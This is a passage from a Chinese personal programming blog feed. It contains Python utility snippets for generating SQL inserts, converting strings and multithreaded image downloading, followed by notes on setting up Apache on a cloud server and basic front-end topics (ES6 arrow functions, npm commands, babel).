class="keyword">in</span> range(num)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'config.yaml'</span>,<span class="string">'r'</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">config = f.read()</span><br><span class="line">data = yaml.load(config)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1天1440个分钟</span></span><br><span class="line">hour_minute = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1440</span>)]</span><br><span class="line"><span class="comment"># 1440分钟对应的概率</span></span><br><span class="line">hour_minute_probability = data[<span class="string">'probability'</span>]</span><br><span class="line">hour_minute_probability_table = [z <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(hour_minute, hour_minute_probability) <span class="keyword">for</span> z <span class="keyword">in</span> [x] * int(y)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_datetime</span><span class="params">(year, month, num)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    获取datetime</span></span><br><span class="line"><span class="string">    :param year: 年</span></span><br><span class="line"><span class="string">    :param month: 月</span></span><br><span class="line"><span class="string">    :param num: 数量</span></span><br><span class="line"><span class="string">    :return: 按照概率曲线产生的时间</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    result = []</span><br><span class="line"></span><br><span class="line">    month_days = calendar.monthrange(year, month)[<span class="number">1</span>]  <span class="comment"># 当前月有几天</span></span><br><span class="line">    num_each_day = random_avg_split(num, month_days, <span class="number">0.9</span>)  <span class="comment"># 计算每天分配多少数量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> day, day_num <span class="keyword">in</span> zip(range(<span class="number">1</span>, month_days + <span class="number">1</span>), num_each_day):</span><br><span class="line">        this_day = datetime(year, month, day)  <span class="comment"># 当天00:00:00，作为基础数据</span></span><br><span class="line">        print(<span class="string">f'gen <span class="subst">&#123;this_day:%Y-%m-%d&#125;</span> for <span class="subst">&#123;day_num&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(day_num):  <span class="comment"># 按天生成具体数据</span></span><br><span class="line">            <span class="comment"># 随机从1440个minute按照概率曲线取出一个值，作为一个时间的minute</span></span><br><span class="line">            <span class="comment"># 下面两行是概率曲线的核心：</span></span><br><span class="line">            <span class="comment"># 1. 按照分钟概率曲线取具体的数据生成分钟</span></span><br><span class="line">            minute_add = random.choice(hour_minute_probability_table)</span><br><span class="line">            <span class="comment"># 2. 当天的00:00:00，加上分钟数，和随机的秒数，作为create_time</span></span><br><span class="line">            create_time = this_day + timedelta(minutes=minute_add, seconds=random.randint(<span class="number">0</span>, <span class="number">59</span>))</span><br><span class="line"></span><br><span class="line">            result.append(create_time)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># todo 把秒打乱，不要随机分</span></span><br><span class="line">        <span class="comment"># num_in_each_minute = &#123;&#125;  # 分配秒时使用，记录每分钟有多少总数</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    year = <span class="number">2019</span></span><br><span class="line">    month_num = &#123;<span class="number">1</span>: <span class="number">10</span>, <span class="number">2</span>: <span class="number">150</span>, <span class="number">3</span>: <span class="number">200</span>, <span class="number">4</span>: <span class="number">250</span>, <span class="number">5</span>: <span class="number">300</span>, <span class="number">6</span>: <span class="number">400</span>,</span><br><span class="line">                 <span class="number">7</span>: <span class="number">50</span>, <span class="number">8</span>: <span class="number">750</span>, <span class="number">9</span>: <span class="number">90</span>, <span class="number">10</span>: <span class="number">120</span>, <span class="number">11</span>: <span class="number">150</span>, <span class="number">12</span>: <span class="number">180</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./create_time.sql'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> fout:</span><br><span class="line">        sql_template = <span class="string">"""insert into create_time(create_time) values ("""</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> month, num <span class="keyword">in</span> month_num.items():  <span class="comment"># 月份和每月需要产生多少create_time数据</span></span><br><span class="line">            print(<span class="string">f'processing<span class="subst">&#123;month&#125;</span> with <span class="subst">&#123;num&#125;</span>'</span>)  <span class="comment"># 在生成过程中（例如循环）多打印一些参数，监控和debug都会用得到</span></span><br><span class="line">            batch = []</span><br><span class="line">            create_times = get_datetime(year, month, num)</span><br><span class="line">            <span class="keyword">for</span> idx, i <span class="keyword">in</span> enumerate(create_times):</span><br><span class="line">                batch.append(i.strftime(<span class="string">"'%Y-%m-%d %H:%M:%S'"</span>))</span><br><span class="line">                <span class="keyword">if</span> idx % <span class="number">10000</span> == <span class="number">0</span>:  <span class="comment"># 每1万数据刷一次磁盘</span></span><br><span class="line">                    print(<span class="string">'processing'</span>, idx)</span><br><span class="line">                    fout.write(sql_template + <span class="string">'),('</span>.join(batch) + <span class="string">');\n'</span>)</span><br><span class="line">                    fout.flush()</span><br><span class="line">                    batch.clear()</span><br><span class="line">            <span class="keyword">if</span> batch:  <span class="comment"># 跳出循环后，如果不满1万，需要再刷一次磁盘</span></span><br><span class="line">                fout.write(sql_template + <span class="string">'),('</span>.join(batch) + <span class="string">');\n'</span>)</span><br><span class="line">                fout.flush()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><h3 id="10-3-将str-转成list"><a href="#10-3-将str-转成list" class="headerlink" title="10.3 将str 转成list:"></a>10.3 将str 转成list:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deserialize_feature</span><span class="params">(f_data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(f_data) == list:</span><br><span class="line">        <span class="keyword">return</span> f_data</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json.loads(<span class="string">"["</span> + f_data[<span class="number">1</span>:<span class="number">-1</span>] + <span class="string">"]"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 方法二：</span></span><br><span class="line">num_list = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> df.feature_data:</span><br><span class="line">    num = [float(i) <span class="keyword">for</span> i <span class="keyword">in</span> j[<span class="number">1</span>:<span class="number">-1</span>].split(<span class="string">","</span>)][<span class="number">0</span>]</span><br><span class="line">    num_list.append(num)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">将list/dataFrame中元素带上 ‘ ’</span><br><span class="line">lst = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">8</span>]</span><br><span class="line">list(map(<span class="keyword">lambda</span> x : str(x),lst))</span><br><span class="line">[str(i) <span class="keyword">for</span> i <span class="keyword">in</span> lst]   <span class="comment"># ['1', '3', '8']</span></span><br></pre></td></tr></table></figure><h3 id="10-4-获取页面图片"><a href="#10-4-获取页面图片" class="headerlink" title="10.4 获取页面图片"></a>10.4 获取页面图片</h3><h5 id="10-4-1-单线程获取图片"><a href="#10-4-1-单线程获取图片" class="headerlink" title="10.4.1 单线程获取图片"></a>10.4.1 单线程获取图片</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dfrl = dfrl[[<span class="string">'face_id'</span>,<span class="string">'cjtid'</span>]]</span><br><span class="line">url_prefix = <span class="string">"http://127.0.0.1:30057/image_proxy/192.168.10.8:30761/storage/getPicture"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_image</span><span class="params">(sess, img, fname)</span>:</span></span><br><span class="line">    r = sess.get(<span class="string">f"<span class="subst">&#123;url_prefix&#125;</span>/<span class="subst">&#123;img&#125;</span>"</span>, stream=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">with</span> open(fname, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            r.raw.decode_content = <span class="literal">True</span></span><br><span class="line">            shutil.copyfileobj(r.raw, f)</span><br><span class="line">            </span><br><span class="line">image_dir = Path(<span class="string">"unlabelled_images"</span>)</span><br><span class="line">image_dir.mkdir(exist_ok=<span class="literal">True</span>)</span><br><span class="line">face_dir = image_dir.joinpath(<span class="string">"face"</span>)</span><br><span class="line">face_dir.mkdir(exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> sess:</span><br><span class="line">    <span class="keyword">for</span> index, row <span class="keyword">in</span> dfrl.iterrows():</span><br><span class="line">        save_image(sess, row[<span class="string">'cjtid'</span>], face_dir.joinpath(<span class="string">f"<span class="subst">&#123;row[<span class="string">'face_id'</span>]&#125;</span>.jpg"</span>))</span><br></pre></td></tr></table></figure><h5 id="10-4-2-多线程获取图片"><a href="#10-4-2-多线程获取图片" class="headerlink" title="10.4.2 多线程获取图片"></a>10.4.2 多线程获取图片</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> shutil     <span class="comment"># 对文件复制和移动 </span></span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'ssh -f -N -L localhost:30057:192.168.10.8:30057 hgy'</span>)</span><br><span class="line">url_prefix = <span class="string">"http://127.0.0.1:30057/image_proxy/192.168.10.8:30761/storage/getPicture"</span></span><br><span class="line"></span><br><span class="line">faces_df = pd.read_csv(<span class="string">'./onid.csv'</span>)</span><br><span class="line">faces_id = list(faces_df.face_id)</span><br><span class="line">target_images = list(faces_df.target_image_storage_path)</span><br><span class="line"></span><br><span class="line">image_dir = Path(<span class="string">"myDateset"</span>)</span><br><span class="line">image_dir.mkdir(exist_ok=<span class="literal">True</span>)</span><br><span class="line">face_dir = image_dir.joinpath(<span class="string">"face"</span>)</span><br><span class="line">face_dir.mkdir(exist_ok=<span class="literal">True</span>)</span><br><span class="line">sess = requests.Session() </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_image</span><span class="params">(pid, img_path)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_save_image</span><span class="params">(sess, img, fname)</span>:</span></span><br><span class="line">        r = sess.get(<span class="string">f"<span class="subst">&#123;url_prefix&#125;</span>/<span class="subst">&#123;img&#125;</span>"</span>, stream=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">with</span> open(fname, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                r.raw.decode_content = <span class="literal">True</span></span><br><span class="line">                shutil.copyfileobj(r.raw, f)</span><br><span class="line">    _save_image(sess, img_path , face_dir.joinpath(<span class="string">f"<span class="subst">&#123;pid&#125;</span>.jpg"</span>))</span><br><span class="line">    </span><br><span class="line">tasks = []</span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(<span class="number">10</span>) <span class="keyword">as</span> executor, tqdm(total=len(faces_id)) <span class="keyword">as</span> bar:</span><br><span class="line">    <span class="keyword">for</span> download_id, download_pic <span class="keyword">in</span> zip(faces_id, target_images):</span><br><span class="line">        task = executor.submit(download_image, download_id, download_pic)</span><br><span class="line">        task.add_done_callback(<span class="keyword">lambda</span> fut: bar.update(<span class="number">1</span>))</span><br><span class="line">        tasks.append(task)</span><br><span class="line">    wait(tasks)</span><br><span class="line">sess.close()</span><br></pre></td></tr></table></figure><h3 id="10-5-预写sql-文件"><a href="#10-5-预写sql-文件" class="headerlink" title="10.5 预写sql 文件"></a>10.5 预写sql 文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> typing</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">WORD = <span class="string">""" insert into prescription_id_reorder(`id`, name) values """</span> </span><br><span class="line">INTO_VALUES = <span class="string">"""(&#123;id&#125;,&#123;name&#125;)"""</span></span><br><span class="line"></span><br><span class="line">iterate_elements_page(out_list,write_pres_detail_sql,DEFAULT_PAGE_SIZE,mk = <span class="number">110</span>,ak = <span class="number">47</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iterate_elements_page</span><span class="params">(list_data, action, page_size, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    分页迭代list</span></span><br><span class="line"><span class="string">    :param list_data:</span></span><br><span class="line"><span class="string">    :param action: 分页动作</span></span><br><span class="line"><span class="string">    :param page_size: 分页大小</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    page_start = <span class="number">0</span></span><br><span class="line">    total = len(list_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> total == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> page_size &gt;= total:</span><br><span class="line">        <span class="keyword">if</span> len(kwargs) != <span class="number">0</span>:</span><br><span class="line">            action(list_data, kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            action(list_data)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    stop = ceil(total / page_size)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(stop):</span><br><span class="line">        <span class="comment"># kwargs 非空</span></span><br><span class="line">        page_list = list_data[page_start * page_size: (page_start + <span class="number">1</span>) * page_size]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(kwargs) != <span class="number">0</span>:</span><br><span class="line">            action(page_list, kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            action(page_list)</span><br><span class="line">        page_start += <span class="number">1</span></span><br><span class="line">DEFAULT_PAGE_SIZE = <span class="number">10000</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_pres_detail_sql</span><span class="params">(pres_detail_list: typing.List, arg_dict)</span>:</span></span><br><span class="line">    work_dir = Path(<span class="string">f"<span class="subst">&#123;os.getcwd()&#125;</span>"</span>)</span><br><span class="line">    data_dir = work_dir.joinpath(<span class="string">'output'</span>).joinpath(<span class="string">"prescription_id_reorder"</span>)</span><br><span class="line">    data_dir.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pres_detail_list:</span><br><span class="line">        logging.warning(<span class="string">'empty list return'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    pres_detail_insert_sql = WORD.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">    pres_detail_template_sql = INTO_VALUES.replace(<span class="string">'\n'</span>, <span class="string">''</span>).replace(<span class="string">' '</span>, <span class="string">''</span>)</span><br><span class="line">    filename = Path(data_dir, <span class="string">f"prescription_id_<span class="subst">&#123;arg_dict[<span class="string">'mk'</span>]&#125;</span>_<span class="subst">&#123;arg_dict[<span class="string">'ak'</span>]&#125;</span>.txt"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sql_out = open(filename, <span class="string">'ab'</span>, buffering=<span class="number">33554432</span>)</span><br><span class="line"></span><br><span class="line">    sql_out.write(pres_detail_insert_sql.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    first = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pres_detail <span class="keyword">in</span> pres_detail_list:</span><br><span class="line">        <span class="keyword">if</span> first:</span><br><span class="line">            first = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sql_out.write(<span class="string">b','</span>)</span><br><span class="line">        sql_out.write(pres_detail_template_sql.format(**pres_detail).encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    sql_out.write(<span class="string">b';\n'</span>)</span><br><span class="line">    sql_out.flush()</span><br><span class="line">    sql_out.close()</span><br></pre></td></tr></table></figure><h3 id="10-6-将数据随机分配到不同的间段"><a href="#10-6-将数据随机分配到不同的间段" class="headerlink" title="10.6 将数据随机分配到不同的间段"></a>10.6 将数据随机分配到不同的间段</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">id_sequence</span><span class="params">(from_id)</span>:</span></span><br><span class="line">    i = from_id</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">yield</span> i</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reorder</span><span class="params">(online_max_id, gap, data)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :param online_max_id: 线上表的最大ID</span></span><br><span class="line"><span class="string">    :param gap: 两个ID段的间隔</span></span><br><span class="line"><span class="string">    :param data: 待排序的数据</span></span><br><span class="line"><span class="string">            [(10020, datetime(2019,9,18,23,45,56)), (10031, datetime(2019,9,18,23,46,56))]</span></span><br><span class="line"><span class="string">    :return: 新ID</span></span><br><span class="line"><span class="string">            [(10020, datetime(2019,9,18,23,45,56), 100001), (10031, datetime(2019,9,18,23,46,56), 100002)]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># 计算需要分多少个段</span></span><br><span class="line">    seg = [id_sequence(i * (online_max_id + gap)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, ceil(len(data) / online_max_id) + <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> [(*d, next(seg[randint(<span class="number">0</span>, len(seg) - <span class="number">1</span>)])) <span class="keyword">for</span> idx, d <span class="keyword">in</span> enumerate(sorted(data, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>]))]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>基于ECS搭建云上博客</title>
      <link href="2023/04/16/%E5%9F%BA%E4%BA%8EECS%E6%90%AD%E5%BB%BA%E4%BA%91%E4%B8%8A%E5%8D%9A%E5%AE%A2/"/>
      <url>2023/04/16/%E5%9F%BA%E4%BA%8EECS%E6%90%AD%E5%BB%BA%E4%BA%91%E4%B8%8A%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="基于ECS搭建云上博客"><a href="#基于ECS搭建云上博客" class="headerlink" title="基于ECS搭建云上博客"></a>基于ECS搭建云上博客</h1><h1 id="一-安装-Apache-HTTP-服务"><a href="#一-安装-Apache-HTTP-服务" class="headerlink" title="一. 安装 Apache HTTP 服务"></a>一. 安装 Apache HTTP 服务</h1><p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。</p><p>\1.  执行如下命令，安装Apache服务及其扩展包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install httpd httpd-manual mod_ssl mod_perl mod_auth_mysql</span><br></pre></td></tr></table></figure><p>返回类似如下图结果则表示安装成功。</p><p><img src="https://img.alicdn.com/tfs/TB1l7DUHpY7gK0jSZKzXXaikpXa-1050-137.png" alt="img"></p><p>\2.  执行如下命令，启动Apache服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start httpd.service</span><br></pre></td></tr></table></figure><p>\3.  测试Apache服务是否安装并启动成功。</p><p>Apache默认监听80端口，所以只需在浏览器访问ECS分配的IP地址http://&lt;ECS公网地址&gt;，如下图：</p><p><img src="https://img.alicdn.com/tfs/TB1HmVpaepyVu4jSZFhXXbBpVXa-1920-937.png" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>前端技术</title>
      <link href="2023/04/16/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
      <url>2023/04/16/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="前端技术"><a href="#前端技术" class="headerlink" title="前端技术**"></a>前端技术**</h1><p><a href="https://www.cnblogs.com/hider/p/11614688.html" target="_blank" rel="noopener">markdown的使用</a></p><p><b><font size="4" color="black">标签 </font></b></p><hr><h2 id="一-HTML"><a href="#一-HTML" class="headerlink" title="一. HTML"></a>一. HTML</h2><h5 id="1-6-箭头函数-（与lambda表达式相似）"><a href="#1-6-箭头函数-（与lambda表达式相似）" class="headerlink" title="1.6 箭头函数 （与lambda表达式相似）"></a>1.6 箭头函数 （与lambda表达式相似）</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 参数+函数体</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 传统方式</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> f1 = <span class="function"><span class="keyword">function</span> <span class="params">(a)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> a</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(f1(<span class="string">"hi"</span>))</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// ES6 方式:</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> f2 = <span class="function"><span class="params">a</span> =&gt;</span> a</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(f2(<span class="string">"hello"</span>))</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f1 = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(f1(<span class="number">2</span>, <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f2 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b</span><br><span class="line"><span class="built_in">console</span>.log(f2(<span class="number">4</span>, <span class="number">6</span>))</span><br></pre></td></tr></table></figure><h2 id="二-VUE"><a href="#二-VUE" class="headerlink" title="二. VUE"></a>二. VUE</h2><h3 id="2-3-axios-在vue中发送ajax请求"><a href="#2-3-axios-在vue中发送ajax请求" class="headerlink" title="2.3 axios  在vue中发送ajax请求"></a>2.3 axios  在vue中发送ajax请求</h3><h2 id="三-NodeJS"><a href="#三-NodeJS" class="headerlink" title="三. NodeJS"></a>三. NodeJS</h2><p><code>javaScript运行环境</code></p><h3 id="3-1-npm"><a href="#3-1-npm" class="headerlink" title="3.1 npm"></a>3.1 npm</h3><p><code>包管理工具 跟Java中的maven相似</code></p><h4 id="3-1-1-npm-相关命令"><a href="#3-1-1-npm-相关命令" class="headerlink" title="3.1.1 npm 相关命令"></a>3.1.1 npm 相关命令</h4><table><thead><tr><th>命令</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>npm init （-y）</td><td>初始化npm项目</td><td>npm init <a href="mailto:jquery@2.1.x">jquery@2.1.x</a> 下载jquery并指定版本</td></tr><tr><td>npm install 依赖名</td><td>下载依赖</td><td></td></tr><tr><td>npm config get registry</td><td>查看使用的依赖仓库</td><td></td></tr><tr><td>npm config set registry <a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a></td><td>配置淘宝的npm镜像</td><td></td></tr><tr><td>npm config list</td><td>查看配置信息</td><td></td></tr><tr><td>npm update 包名</td><td>更新包</td><td></td></tr><tr><td>npm update -g 包名</td><td>全局更新</td><td></td></tr><tr><td>npm uninstall （-g） 包名</td><td>卸载包</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="3-2-babel"><a href="#3-2-babel" class="headerlink" title="3.2. babel"></a>3.2. babel</h3><p><code>转码器，将es6转成es5代码</code></p><p>下载babel : npm install -g babel-cli</p><h4 id="4-1-将es6-转成es5"><a href="#4-1-将es6-转成es5" class="headerlink" title="4.1 将es6 转成es5"></a>4.1 将es6 转成es5</h4><p>编写 es6文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 